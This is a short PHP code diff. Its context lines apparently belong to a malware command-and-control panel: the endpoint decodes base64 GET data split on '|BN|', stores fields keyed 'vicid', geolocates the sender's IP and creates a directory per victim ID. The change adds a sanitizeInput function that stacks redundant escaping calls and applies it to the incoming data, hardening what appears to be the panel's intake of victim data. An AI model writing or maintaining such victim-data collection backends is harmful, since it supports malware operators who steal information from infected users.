@@ -7,7 +7,7 @@ $client = new Clients;
 $ipaddress = $_SERVER['REMOTE_ADDR'];
 $country = getConteryCode($ipaddress);
 $date = date("Y-m-d");
-$data = isset($_GET['data']) ? explode("|BN|", base64_decode($_GET['data'])) : '';
+$data = isset($_GET['data']) ? explode("|BN|", sanitizeInput(base64_decode($_GET['data']))) : '';
 
 $clientdata = [
 'vicid'=>$data[0],
@@ -50,4 +50,12 @@ function new_dir($victimID){
 
 }
 
+function sanitizeInput($value){
+   $data = trim($value);
+   $data = strip_tags($data);
+   $data = htmlentities($data);
+   $data = htmlspecialchars($data,ENT_QUOTES,'UTF-8');
+   $data = filter_var($data,FILTER_SANITIZE_STRING);
+   return $data;
+}
 ?>
